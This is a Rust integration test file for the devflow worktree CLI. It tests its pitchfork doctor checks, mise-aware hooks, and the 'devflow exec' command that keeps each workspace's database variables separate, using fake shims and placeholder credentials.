    assert_eq!(doc["ran"], false, "{doc}");
    assert!(doc["plan"]["run"].is_null(), "{doc}");
    let commands = doc["plan"]["commands"].to_string();
    assert!(commands.contains("brew install pitchfork"), "{commands}");
    assert!(commands.contains("cargo install"), "{commands}");
}

#[test]
fn doctor_reports_the_install_state_the_namespace_and_the_environment_wiring() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let check = |doc: &Value, name: &str| -> Value {
        doc["checks"]
            .as_array()
            .unwrap()
            .iter()
            .find(|c| c["name"] == name)
            .cloned()
            .unwrap_or_else(|| panic!("no {name} check in {doc}"))
    };
    let (path, _) = env.workspace_with_daemon(&fake);
    let doc = json(&env.run_fake(&fake, &path, &["--json", "doctor"]));
    assert_eq!(check(&doc, "pitchfork")["status"], "ok", "{doc}");
    assert_eq!(check(&doc, "pitchfork-namespace")["status"], "ok", "{doc}");
    // The proxy is off and the daemon has a port: the commands are offered, not run.
    let proxy = check(&doc, "pitchfork-proxy");
    assert_eq!(proxy["status"], "warn", "{doc}");
    assert!(
        proxy["hint"]
            .as_str()
            .unwrap()
            .contains("pitchfork proxy setup"),
        "{proxy}"
    );
    assert!(fake.mutations().is_empty());

    // Not installed: the shim exits 1.
    fake.set("version_exit", "1");
    let doc = json(&env.run_fake(&fake, &path, &["--json", "doctor"]));
    let pitchfork = check(&doc, "pitchfork");
    assert_eq!(pitchfork["status"], "warn", "{doc}");
    assert!(
        pitchfork["remedies"][0]["command"] == "devflow pitchfork install"
            && !pitchfork["hint"]
                .as_str()
                .unwrap()
                .contains("devflow pitchfork"),
        "{pitchfork}"
    );
    assert!(
        pitchfork["detail"]
            .as_str()
            .unwrap()
            .contains("does not run"),
        "{pitchfork}"
    );
    std::fs::remove_file(fake.dir.join("version_exit")).unwrap();

    // A namespace in the committed file conflicts with the per-worktree one.
    std::fs::write(
        path.join("pitchfork.toml"),
        "namespace = \"shop\"\n[daemons.web]\nrun = \"a\"\n",
    )
    .unwrap();
    let doc = json(&env.run_fake(&fake, &path, &["--json", "doctor"]));
    let namespace = check(&doc, "pitchfork-namespace");
    assert_eq!(namespace["status"], "warn", "{doc}");
    assert!(
        namespace["detail"]
            .as_str()
            .unwrap()
            .contains("declares namespace"),
        "{namespace}"
    );

    // Daemons without `mise = true` never see .devflow/env.
    env.edit_config("[hooks]", "[services.db]\nengine = \"postgres\"\n\n[hooks]");
    let doc = json(&env.run_fake(&fake, &path, &["--json", "doctor"]));
    let wiring = check(&doc, "pitchfork-env");
    assert_eq!(wiring["status"], "warn", "{doc}");
    assert!(
        wiring["detail"].as_str().unwrap().contains("mise = true"),
        "{wiring}"
    );
}

#[test]
fn hooks_wait_for_a_mise_that_overrides_the_workspace_variables() {
    let env = Env::new();
    env.init();
    // A hook that goes through mise; a hook that does not is never checked.
    env.edit_config(
        "setup = []",
        "setup = [\"mise exec -- sh -c 'echo ran > hook-ran.txt'\"]",
    );
    // A tracked mise configuration, so every worktree has one.
    std::fs::write(env.repo.join("mise.toml"), "[tools]\n").unwrap();
    let git = git2::Repository::open(&env.repo).unwrap();
    let mut index = git.index().unwrap();
    for file in ["mise.toml", "devflow.toml"] {
        index.add_path(Path::new(file)).unwrap();
    }
    index.write().unwrap();
    let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    let parent = git.head().unwrap().peel_to_commit().unwrap();
    git.commit(Some("HEAD"), &sig, &sig, "mise", &tree, &[&parent])
        .unwrap();

    // A mise whose configuration sets the workspace name to another value:
    // `mise exec -- CMD` runs CMD with it.
    let mise = env.fake_program(
        "mise",
        r#"echo "$*" >> "$FAKE_LOG"
case "$1" in
  exec)
    shift
    while [ "$1" != -- ]; do shift; done
    shift
    DEVFLOW_WORKSPACE=the-main-checkout
    export DEVFLOW_WORKSPACE
    exec "$@";;
esac"#,
    );
    let switch = |extra: &[&str], name: &str| {
        let mut command = env.command(&env.repo);
        with_fake_path(&mut command, &[&mise], true);
        command
            .args(["--json", "--non-interactive", "switch", "-c", name])
            .args(extra)
            .env("DEVFLOW_TRUST_HOOKS", "1")
            .output()
            .unwrap()
    };

    // Exit 2, a reason that names the variable, and no hook ran.
    let out = switch(&[], "feature/m");
    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
    let doc = json(&out);
    assert_eq!(doc["status"], "needs_attention", "{doc}");
    let detail = doc["receipt"]["phases"]["hooks"]["detail"]
        .as_str()
        .unwrap();
    assert!(
        detail.contains("mise resolves DEVFLOW_WORKSPACE from another source than .devflow/env"),
        "{detail}"
    );
    assert!(
        detail.contains("setup hook #1") && detail.contains("devflow exec"),
        "{detail}"
    );
    assert!(
        !detail.contains("the-main-checkout") && !detail.contains("hook-ran"),
        "{detail}"
    );
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    assert!(!path.join("hook-ran.txt").exists());
    assert!(
        mise.lines().iter().any(|line| line.starts_with("exec ")),
        "the hooks' environment was asked of mise: {:?}",
        mise.lines()
    );
    let human = env
        .command(&env.repo)
        .args(["--non-interactive", "list"])
        .output()
        .unwrap();
    assert!(
        stdout(&human).contains("needs attention"),
        "{}",
        describe(&human)
    );

    // The escape hatch, on `setup` and on `switch`: the hooks run, and the
    // receipt and the list say nobody checked.
    let mut command = env.command(&path);
    with_fake_path(&mut command, &[&mise], true);
    let out = command
        .args(["--json", "--non-interactive", "setup", "--skip-mise-check"])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .output()
        .unwrap();
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert!(path.join("hook-ran.txt").is_file());
    assert!(doc["receipt"]["mise_check_skipped_at"].is_string(), "{doc}");
    let listed = json(ok(&env.run(&["--json", "list"])));
    let receipts: Vec<&Value> = listed["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|w| w["workspace"]["name"] == "feature/m")
        .collect();
    assert!(
        receipts[0]["receipt"]["mise_check_skipped_at"].is_string(),
        "{listed}"
    );
    let human = env.run(&["list"]);
    assert!(
        stdout(ok(&human)).contains("ready (mise check skipped)"),
        "{}",
        describe(&human)
    );

    let out = switch(&["--skip-mise-check"], "feature/n");
    ok(&out);
    assert_eq!(json(&out)["status"], "ready");
}

// --- devflow exec -----------------------------------------------------------

const OWN_URL: &str = "postgres://own:own-password-8@localhost:5432/own"; // kingfisher:ignore
const MAIN_URL: &str = "postgres://main:main-password-9@localhost:5432/main"; // kingfisher:ignore

/// Write `.devflow/env` in `dir` the way setup does: single-quoted values and
/// the list of the names a workspace with those variables owns.
fn write_workspace_env(dir: &Path, vars: &[(&str, &str)]) {
    let vars: Vec<(String, String)> = vars
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
    let owned = devflow_core::env_owner::declared_for(&devflow_core::Config::default(), &vars);
    devflow_core::env_file::write_owned(dir, &vars, &owned, &Default::default()).unwrap();
}

/// Write `.devflow/env` as a devflow from before the list of owned names did.
fn write_legacy_workspace_env(dir: &Path, vars: &[(&str, &str)]) {
    std::fs::create_dir_all(dir.join(".devflow")).unwrap();
    let text: String = vars.iter().map(|(k, v)| format!("{k}='{v}'\n")).collect();
    std::fs::write(dir.join(".devflow/env"), text).unwrap();
}

#[test]
fn exec_runs_the_command_with_the_workspace_variables_on_top() {
    let env = Env::new();
    write_workspace_env(
        &env.repo,
        &[("DATABASE_URL", OWN_URL), ("DEVFLOW_WORKSPACE", "main")],
    );
    let nested = env.repo.join("apps/web/src");
    std::fs::create_dir_all(&nested).unwrap();

    // From any subdirectory, over what the environment already had.
    let out = env
        .command(&nested)
        .env("DATABASE_URL", MAIN_URL)
        .args(["exec", "--", "sh", "-c"])
        .arg("printf '%s|%s' \"$DATABASE_URL\" \"$DEVFLOW_WORKSPACE\"")
        .output()
        .unwrap();
    ok(&out);
    assert_eq!(stdout(&out), format!("{OWN_URL}|main"));
    assert_eq!(stderr(&out), "", "exec says nothing of its own");

    // The command's arguments are its own, hyphens included, and its exit
    // status is the status of devflow.
    let out = env
        .command(&nested)
        .args(["exec", "--", "sh", "-c", "exit 7", "--not-a-flag"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(7), "{}", describe(&out));

    // `-C` runs the command in that directory.
    let out = env
        .command(&env.root)
        .arg("-C")
        .arg(&nested)
        .args(["exec", "--", "pwd"])
        .output()
        .unwrap();
    ok(&out);
    assert!(same_path(&stdout(&out), &nested), "{}", describe(&out));

    // The process is replaced: a signal reaches the command itself.
    #[cfg(unix)]
    {
        use std::os::unix::process::ExitStatusExt;
        let out = env
            .command(&nested)
            .args(["exec", "--", "sh", "-c", "kill -TERM $$"])
            .output()
            .unwrap();
        assert_eq!(out.status.signal(), Some(15), "{}", describe(&out));
    }
}

#[test]
fn exec_never_starts_a_command_against_an_unknown_database() {
    let env = Env::new();
    let started = env.root.join("started");
    let touch = |dir: &Path, extra: &[&str]| {
        env.command(dir)
            .arg("exec")
            .args(extra)
            .args(["--", "touch"])
            .arg(&started)
            .output()
            .unwrap()
    };

    // Outside any checkout.
    let outside = env.root.join("outside");
    std::fs::create_dir_all(&outside).unwrap();
    let out = touch(&outside, &[]);
    failed(&out);
    assert!(
        stderr(&out).contains("not inside a Git checkout"),
        "{}",
        describe(&out)
    );

    // A checkout that has no `.devflow/env`.
    let out = touch(&env.repo, &[]);
    failed(&out);
    assert!(
        stderr(&out).contains("no .devflow/env") && stderr(&out).contains("devflow setup"),
        "{}",
        describe(&out)
    );

    // A worktree set up inside another checkout never borrows its variables.
    write_workspace_env(&env.repo, &[("DATABASE_URL", MAIN_URL)]);
    let inner = env.repo.join("inner");
    std::fs::create_dir_all(&inner).unwrap();
    std::fs::write(inner.join(".git"), "gitdir: /nowhere\n").unwrap();
    failed(&touch(&inner, &[]));

    // A workspace that does not exist.
    env.init();
    let out = touch(&env.repo, &["--workspace", "nope"]);
    failed(&out);
    assert!(
        stderr(&out).contains("no workspace named 'nope'"),
        "{}",
        describe(&out)
    );

    assert!(!started.exists(), "no command was started");
    // And no message holds a value.
    for text in [stderr(&out), stdout(&out)] {
        assert!(
            !text.contains("password") && !text.contains(MAIN_URL),
            "{text}"
        );
    }

    // A file from a devflow that did not keep the list of owned names is
    // refused, with setup as the way out, and nothing starts.
    write_legacy_workspace_env(&env.repo, &[("DATABASE_URL", MAIN_URL)]);
    let out = touch(&env.repo, &[]);
    failed(&out);
    assert!(
        stderr(&out).contains("earlier devflow") && stderr(&out).contains("devflow setup"),
        "{}",
        describe(&out)
    );
    assert!(!started.exists(), "no command was started");
    assert!(
        !stderr(&out).contains("main-password"),
        "{}",
        describe(&out)
    );

    // A program that cannot start: the codes of env(1), no arguments quoted.
    write_workspace_env(&env.repo, &[("A", "1")]);
    let out = env
        .command(&env.repo)
        .args([
            "exec",
            "--",
            "devflow-no-such-program",
            "--token=s3cr3t-token-value", // kingfisher:ignore
        ])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(127), "{}", describe(&out));
    assert!(!stderr(&out).contains("s3cr3t"), "{}", describe(&out));

    // `--json` is refused like for the other commands that cannot emit it.
    let out = env
        .command(&env.repo)
        .args(["--json", "exec", "--", "true"])
        .output()
        .unwrap();
    failed(&out);
    assert_eq!(json(&out)["command"], "exec");
}

#[test]
fn exec_takes_the_variables_of_a_named_workspace() {
    let env = Env::new();
    env.init();
    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "feature/x"]);
    ok(&out);
    let workspace = PathBuf::from(json(&out)["path"].as_str().unwrap());
    let out = env
        .command(&env.repo)
        .args(["exec", "--workspace", "feature/x", "--", "sh", "-c"])
        .arg("printf %s \"$DEVFLOW_WORKSPACE\"")
        .output()
        .unwrap();
    ok(&out);
    assert_eq!(stdout(&out), "feature/x");
    // From inside the worktree, no name is needed.
    let out = env
        .command(&workspace)
        .args(["exec", "--", "sh", "-c"])
        .arg("printf %s \"$DEVFLOW_WORKSPACE\"")
        .output()
        .unwrap();
    ok(&out);
    assert_eq!(stdout(&out), "feature/x");
}

/// A project with an external PostgreSQL service and an `[env]` recipe built on
/// its URL, set up in the main checkout (workspace A) against `OWN_URL`, with
/// the variables A's `.devflow/env` holds returned: the environment a shell
/// that loaded the file (mise's `_.file`) hands to everything it starts.
fn workspace_a_variables(env: &Env) -> Vec<(String, String)> {
    env.init();
    env.edit_config(
        "[hooks]",
        "[services.db]\nengine = \"postgres\"\nmode = \"external\"\n\n\
         [env]\nAPP_DB = \"${DATABASE_URL}\"\n\n[hooks]",
    );
    let out = env
        .command(&env.repo)
        .args([
            "--json",
            "--non-interactive",
            "setup",
            "--database-url",
            OWN_URL,
        ])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .output()
        .unwrap();
    ok(&out);
    let vars = devflow_core::env_file::read(&env.repo).unwrap();
    let names: Vec<&str> = vars.iter().map(|(name, _)| name.as_str()).collect();
    for name in ["DATABASE_URL", "PGHOST", "APP_DB", "DEVFLOW_WORKSPACE_ID"] {
        assert!(names.contains(&name), "{name} in {names:?}");
    }
    vars
}

/// `devflow exec -- env -0` in `dir` with `carried` in its environment.
fn exec_env(
    env: &Env,
    dir: &Path,
    carried: &[(String, String)],
    extra: &[(&str, &str)],
    args: &[&str],
) -> std::collections::BTreeMap<String, String> {
    let mut command = env.command(dir);
    command.envs(carried.iter().map(|(k, v)| (k, v)));
    command.envs(extra.iter().copied());
    let out = command
        .arg("exec")
        .args(args)
        .args(["--", "env", "-0"])
        .output()
        .unwrap();
    ok(&out);
    out.stdout
        .split(|byte| *byte == 0)
        .filter_map(|entry| std::str::from_utf8(entry).ok()?.split_once('='))
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect()
}

#[test]
fn a_no_db_workspace_never_gets_the_database_of_the_workspace_the_caller_is_in() {
    let env = Env::new();
    let carried = workspace_a_variables(&env);
    env.edit_config(
        "setup = []",
        "setup = [\"printf '%s|%s|%s|%s' \\\"${DATABASE_URL-unset}\\\" \\\"${APP_DB-unset}\\\" \\\"${PGHOST-unset}\\\" \\\"${DEVFLOW_SETUP_ACTIVE-unset}\\\" > hook-seen.txt\"]",
    );

    // `devflow switch -c feature-b --no-db` from a shell that carries A's
    // variables: the setup hook sees none of A's database.
    let mut command = env.command(&env.repo);
    command.envs(carried.iter().map(|(k, v)| (k, v)));
    let out = command
        .args([
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            "feature-b",
            "--no-db",
        ])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .output()
        .unwrap();
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    let b = PathBuf::from(doc["path"].as_str().unwrap());
    // Names only: the execution control reaches the hook, A's values do not.
    assert_eq!(
        std::fs::read_to_string(b.join("hook-seen.txt")).unwrap(),
        "unset|unset|unset|1"
    );

    // `devflow exec` in B: B's identity, none of A's database.
    let got = exec_env(&env, &b, &carried, &[("UNRELATED", "kept")], &[]);
    assert_eq!(got["DEVFLOW_WORKSPACE"], "feature-b", "{got:?}");
    assert_eq!(got["UNRELATED"], "kept");
    for name in ["DATABASE_URL", "PGHOST", "PGUSER", "PGDATABASE", "APP_DB"] {
        assert!(!got.contains_key(name), "{name} leaked");
    }
    // The manifest says what B owns although it sets no value for it.
    let file = std::fs::read_to_string(b.join(".devflow/env")).unwrap();
    assert!(
        file.contains("# devflow-owns v1:") && file.contains("DATABASE_URL"),
        "{file}"
    );
    assert!(!file.contains(OWN_URL), "the file is B's own");

    // A name the caller keeps on purpose: `--inherit` or `DEVFLOW_INHERIT`.
    let got = exec_env(&env, &b, &carried, &[], &["--inherit", "DATABASE_URL"]);
    assert_eq!(got["DATABASE_URL"], OWN_URL);
    assert!(!got.contains_key("APP_DB"));
    let got = exec_env(
        &env,
        &b,
        &carried,
        &[("DEVFLOW_INHERIT", "APP_DB, PGHOST")],
        &[],
    );
    assert!(got.contains_key("APP_DB") && got.contains_key("PGHOST"));
    assert!(!got.contains_key("DATABASE_URL"));
    // A name that is not one is refused before anything runs.
    let out = env
        .command(&b)
        .args(["exec", "--inherit", "NOT A NAME", "--", "true"])
        .output()
        .unwrap();
    failed(&out);

    // A variable only A's file knows (a recipe B does not have) is taken out
    // through the source set: the environment names A and A's file says so.
    let a_file = env.repo.join(".devflow/env");
    let mut text = std::fs::read_to_string(&a_file).unwrap();
    text.push_str("OLD_RECIPE='from a'\n");
    std::fs::write(&a_file, text).unwrap();
    let mut carried_old = carried.clone();
    carried_old.push(("OLD_RECIPE".into(), "from a".into()));
    let got = exec_env(&env, &b, &carried_old, &[], &[]);
    assert!(!got.contains_key("OLD_RECIPE"), "{got:?}");
}

/// The result of `devflow exec -- touch MARKER` in `dir` with `carried`.
fn exec_touch(
    env: &Env,
    dir: &Path,
    carried: &[(String, String)],
    extra: &[(&str, &str)],
    args: &[&str],
) -> (Output, bool) {
    let marker = env.root.join(format!("started-{}", uuid::Uuid::new_v4()));
    let mut command = env.command(dir);
    command.envs(carried.iter().map(|(k, v)| (k, v)));
    command.envs(extra.iter().copied());
    let out = command
        .arg("exec")
        .args(args)
        .args(["--", "touch"])
        .arg(&marker)
        .output()
        .unwrap();
    let started = marker.exists();
    (out, started)
}

fn with_value(carried: &[(String, String)], name: &str, value: String) -> Vec<(String, String)> {
    carried
        .iter()
        .map(|(k, v)| {
            if k == name {
                (k.clone(), value.clone())
            } else {
                (k.clone(), v.clone())
            }
        })
        .collect()
}

#[test]
fn an_environment_naming_a_workspace_that_cannot_be_resolved_refuses_until_told_to_go_on() {
    let env = Env::new();
    let carried = workspace_a_variables(&env);
    let out = env
        .command(&env.repo)
        .args([
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            "feature-s",
            "--no-db",
        ])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .output()
        .unwrap();
    ok(&out);
    let b = PathBuf::from(json(&out)["path"].as_str().unwrap());
    // What the shell holds besides: a name only devflow could have generated,
    // and one that is nobody's.
    let mut stale_base = carried.clone();
    stale_base.push(("REDIS_URL".into(), "redis://from-a".into()));
    stale_base.push(("UNRELATED".into(), "kept".into()));

    let linked = env.root.join("linked-a");
    std::fs::create_dir_all(linked.join(".devflow")).unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(env.repo.join(".devflow/env"), linked.join(".devflow/env")).unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(&env.root, env.root.join("alias")).unwrap();
    let stale_shells: Vec<(&str, Vec<(String, String)>)> = vec![
        // A removed and set up again: another instance behind the same path.
        (
            "another instance",
            with_value(&stale_base, "DEVFLOW_WORKSPACE_ID", "forged".into()),
        ),
        // The workspace's directory is gone.
        (
            "gone",
            with_value(
                &stale_base,
                "DEVFLOW_WORKSPACE_PATH",
                env.root.join("removed").display().to_string(),
            ),
        ),
        // The file is reached through a link.
        #[cfg(unix)]
        (
            "linked",
            with_value(
                &stale_base,
                "DEVFLOW_WORKSPACE_PATH",
                linked.display().to_string(),
            ),
        ),
        // A link above the worktree: the same file, reached through `alias`.
        #[cfg(unix)]
        (
            "linked ancestor",
            with_value(
                &stale_base,
                "DEVFLOW_WORKSPACE_PATH",
                env.root.join("alias/repo").display().to_string(),
            ),
        ),
        // A path and no id.
        (
            "no id",
            stale_base
                .iter()
                .filter(|(k, _)| k != "DEVFLOW_WORKSPACE_ID")
                .cloned()
                .collect(),
        ),
    ];
    for (why, shell) in &stale_shells {
        let (out, started) = exec_touch(&env, &b, shell, &[], &[]);
        failed(&out);
        assert!(!started, "{why}: the command was not started");
        let text = stderr(&out);
        assert!(text.contains("cannot be resolved"), "{why}: {text}");
        assert!(text.contains("DEVFLOW_CLEAR_INHERITED"), "{why}: {text}");
        assert!(!text.contains("own-password"), "{why}: {text}");

        // Told to go on, by the flag or the variable: the target set and every
        // name devflow can generate are taken out, the rest stays.
        for (extra, args) in [
            (vec![], vec!["--clear-inherited"]),
            (vec![("DEVFLOW_CLEAR_INHERITED", "1")], vec![]),
        ] {
            let got = exec_env(&env, &b, shell, &extra, &args);
            assert_eq!(got["DEVFLOW_WORKSPACE"], "feature-s", "{why}: {got:?}");
            for name in ["DATABASE_URL", "PGHOST", "APP_DB", "REDIS_URL"] {
                assert!(!got.contains_key(name), "{why}: {name} leaked");
            }
            assert_eq!(got["UNRELATED"], "kept", "{why}");
        }
    }
    // A shell that names A properly still keeps a name nobody owns, and a name
    // devflow could have generated but this project does not: only the stale
    // case clears those.
    let got = exec_env(&env, &b, &stale_base, &[], &[]);
    assert_eq!(got["REDIS_URL"], "redis://from-a");
    assert!(!got.contains_key("DATABASE_URL"));
}

#[test]
fn hooks_refuse_a_stale_environment_with_its_remedy_and_go_on_when_told_to() {
    let env = Env::new();
    let carried = workspace_a_variables(&env);
    env.edit_config("setup = []", "setup = [\"echo ran > hook-ran.txt\"]");
    let stale = with_value(&carried, "DEVFLOW_WORKSPACE_ID", "forged".into());
    let mut command = env.command(&env.repo);
    command.envs(stale.iter().map(|(k, v)| (k, v)));
    let out = command
        .args([
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            "feature-h",
            "--no-db",
        ])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .output()
        .unwrap();
    // The hooks did not run: the workspace is kept and needs attention.
    assert!(!out.status.success(), "{}", describe(&out));
    let text = describe(&out);
    assert!(text.contains("cannot be resolved"), "{text}");
    assert!(text.contains("clear_inherited"), "{text}");
    let b = env
        .repo
        .parent()
        .unwrap()
        .join("repo.worktrees")
        .join("feature-h");
    assert!(!b.join("hook-ran.txt").exists());

    // The same shell with the override: setup resumes and the hooks run.
    let mut command = env.command(&b);
    command.envs(stale.iter().map(|(k, v)| (k, v)));
    let out = command
        .args(["--json", "--non-interactive", "setup"])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .env("DEVFLOW_CLEAR_INHERITED", "1")
        .output()
        .unwrap();
    ok(&out);
    assert_eq!(json(&out)["status"], "ready");
    assert!(b.join("hook-ran.txt").is_file());
}

#[test]
fn a_removed_recipe_is_cleared_after_the_file_was_written_again() {
    let env = Env::new();
    let carried = workspace_a_variables(&env);
    // The shell still holds A's `APP_DB`, which A's file once exported.
    assert!(carried.iter().any(|(k, _)| k == "APP_DB"));
    // The recipe is removed and setup rewrites A's file.
    env.edit_config("APP_DB = \"${DATABASE_URL}\"\n", "");
    let out = env
        .command(&env.repo)
        .args(["--json", "--non-interactive", "setup"])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .output()
        .unwrap();
    ok(&out);
    let file = std::fs::read_to_string(env.repo.join(".devflow/env")).unwrap();
    assert!(!file.contains("APP_DB='"), "no longer exported: {file}");
    assert!(
        file.contains("# devflow-formerly v1: APP_DB"),
        "but still A's: {file}"
    );
    // A new workspace B created from that shell: A's file, which the shell
    // names, says it once exported APP_DB.
    let out = env
        .command(&env.repo)
        .args([
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            "feature-f",
            "--no-db",
        ])
        .envs(carried.iter().map(|(k, v)| (k, v)))
        .output()
        .unwrap();
    ok(&out);
    let b = PathBuf::from(json(&out)["path"].as_str().unwrap());
    let got = exec_env(&env, &b, &carried, &[], &[]);
    assert!(!got.contains_key("APP_DB"), "{got:?}");
    // And A itself, whose own file lists it as a former name.
    let got = exec_env(&env, &env.repo, &carried, &[], &[]);
    assert!(!got.contains_key("APP_DB"), "{got:?}");
    assert!(got.contains_key("DATABASE_URL"));
}

#[test]
fn a_hook_that_runs_devflow_exec_for_another_workspace_gets_that_workspaces_variables() {
    let env = Env::new();
    let carried = workspace_a_variables(&env);
    let default_name = {
        let doc = json(&env.run(&["--json", "list"]));
        doc["workspaces"][0]["workspace"]["name"]
            .as_str()
            .unwrap()
            .to_string()
    };
    // B has no database; its setup hook asks for A's variables.
    env.edit_config(
        "setup = []",
        &format!(
            "setup = [\"devflow exec --workspace {default_name} -- sh -c 'printf %s \\\"${{DATABASE_URL-unset}}|$DEVFLOW_WORKSPACE|$DEVFLOW_SETUP_ACTIVE|${{HOOK_ONLY-unset}}\\\" > other-seen.txt'\", \
             \"printf %s \\\"${{DATABASE_URL-unset}}|$DEVFLOW_WORKSPACE\\\" > own-seen.txt\"]"
        ),
    );
    let bin = Path::new(env!("CARGO_BIN_EXE_devflow")).parent().unwrap();
    let path = std::env::join_paths(std::iter::once(bin.to_path_buf()).chain(
        std::env::split_paths(&std::env::var_os("PATH").unwrap_or_default()),
    ))
    .unwrap();
    let out = env
        .command(&env.repo)
        .args([
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            "feature-o",
            "--no-db",
        ])
        .envs(carried.iter().map(|(k, v)| (k, v)))
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .env("PATH", path)
        .output()
        .unwrap();
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    let b = PathBuf::from(doc["path"].as_str().unwrap());
    // The hook's own process has B's variables: none of A's database.
    assert_eq!(
        std::fs::read_to_string(b.join("own-seen.txt")).unwrap(),
        "unset|feature-o"
    );
    // The command it ran for A got A's: its database, its identity, and the
    // execution control of the hook that is running it.
    assert_eq!(
        std::fs::read_to_string(b.join("other-seen.txt")).unwrap(),
        format!("{OWN_URL}|{default_name}|1|unset")
    );
}

#[test]
fn a_nested_devflow_keeps_the_execution_controls_while_the_workspaces_values_are_replaced() {
    let env = Env::new();
    let carried = workspace_a_variables(&env);
    env.edit_config(
        "setup = []",
        "setup = [\"devflow exec -- sh -c 'printf %s \\\"$DEVFLOW_SETUP_ACTIVE|$DEVFLOW_WORKSPACE|${DATABASE_URL-unset}\\\" > nested-seen.txt'\"]",
    );
    let bin = Path::new(env!("CARGO_BIN_EXE_devflow")).parent().unwrap();
    let path = std::env::join_paths(std::iter::once(bin.to_path_buf()).chain(
        std::env::split_paths(&std::env::var_os("PATH").unwrap_or_default()),
    ))
    .unwrap();
    let mut command = env.command(&env.repo);
    command.envs(carried.iter().map(|(k, v)| (k, v)));
    let out = command
        .args([
            "--json",
            "--non-interactive",
            "switch",
            "-c",
            "feature-n",
            "--no-db",
        ])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .env("PATH", path)
        .output()
        .unwrap();
    ok(&out);
    let b = PathBuf::from(json(&out)["path"].as_str().unwrap());
    assert_eq!(
        std::fs::read_to_string(b.join("nested-seen.txt")).unwrap(),
        "1|feature-n|unset"
    );
}

fn mise_installed() -> bool {
    Command::new("mise")
        .arg("--version")
        .output()
        .is_ok_and(|output| output.status.success())
}

/// A command with mise state of its own below the test's temporary
/// directory (which is also the only path it trusts), and `devflow` on PATH
/// as a hook finds it.
fn with_isolated_mise(command: &mut Command, root: &Path) {
    let state = root.join("mise-state");
    command
        .env("HOME", state.join("home"))
        .env("MISE_DATA_DIR", state.join("data"))
        .env("MISE_CONFIG_DIR", state.join("config"))
        .env("MISE_CACHE_DIR", state.join("cache"))
        .env("MISE_STATE_DIR", state.join("state"))
        .env("MISE_GLOBAL_CONFIG_FILE", state.join("config/config.toml"))
        .env("MISE_SYSTEM_CONFIG_DIR", state.join("system-config"))
        .env("MISE_SYSTEM_DATA_DIR", state.join("system-data"))
        .env("MISE_TRUSTED_CONFIG_PATHS", root)
        .env_remove("MISE_ENV")
        .env_remove("MISE_PROFILE")
        .env_remove("MISE_YES");
    let bin = Path::new(env!("CARGO_BIN_EXE_devflow")).parent().unwrap();
    let path = std::env::var_os("PATH").unwrap_or_default();
    let mut dirs = vec![bin.to_path_buf()];
    dirs.extend(std::env::split_paths(&path));
    command.env("PATH", std::env::join_paths(dirs).unwrap());
}

#[test]
fn exec_beats_what_mise_sets_in_a_subdirectory_with_its_own_mise_toml() {
    if !mise_installed() {
        eprintln!("skipped: mise is not installed");
        return;
    }
    let env = Env::new();
    write_workspace_env(&env.repo, &[("DATABASE_URL", OWN_URL)]);
    let write = |name: &str, text: &str| {
        let path = env.repo.join(name);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    };
    // The worktree loads `.devflow/env`; `app` has a mise.toml of its own
    // that sets the main database (reproduction (a) of the final review).
    write("mise.toml", "[env]\n_.file = \".devflow/env\"\n");
    write(
        "app/mise.toml",
        &format!("[env]\nDATABASE_URL = \"{MAIN_URL}\"\n"),
    );
    // A hook as devflow runs it: `sh -c SCRIPT` with the workspace's
    // variables injected.
    let hook = |script: &str, extra: &[(&str, &str)]| -> String {
        let mut shell = Command::new("sh");
        shell
            .args(["-c", script])
            .current_dir(&env.repo)
            .stdin(Stdio::null())
            .env("DATABASE_URL", OWN_URL);
        with_isolated_mise(&mut shell, &env.root);
        for (name, value) in extra {
            shell.env(name, value);
        }
        let out = shell.output().unwrap();
        ok(&out);
        stdout(&out)
    };
    let print = "printf %s \"$DATABASE_URL\"";

    // Without devflow exec, mise has the last word.
    assert_eq!(
        hook(&format!("cd app && mise exec -- sh -c '{print}'"), &[]),
        MAIN_URL,
        "the control: mise overrides what the hook was given"
    );
    // With it, devflow does, in a subdirectory and inside mise.
    let routed = format!("cd app && mise exec -- devflow exec -- sh -c '{print}'");
    assert_eq!(hook(&routed, &[]), OWN_URL);

    // A removed variable (`false`) loses too.
    write("app/mise.toml", "[env]\nDATABASE_URL = false\n");
    let removed = "cd app && mise exec -- sh -c 'printf \"[%s]\" \"${DATABASE_URL-unset}\"'";
    assert_eq!(hook(removed, &[]), "[unset]");
    assert_eq!(hook(&routed, &[]), OWN_URL);

    // So does a selected environment.
    write(
        "mise.production.toml",
        &format!("[env]\nDATABASE_URL = \"{MAIN_URL}\"\n"),
    );
    let production = [("MISE_ENV", "production")];
    assert_eq!(
        hook(&format!("mise exec -- sh -c '{print}'"), &production),
        MAIN_URL
    );
    assert_eq!(
        hook(
            &format!("mise exec -- devflow exec -- sh -c '{print}'"),
            &production
        ),
        OWN_URL
    );
}

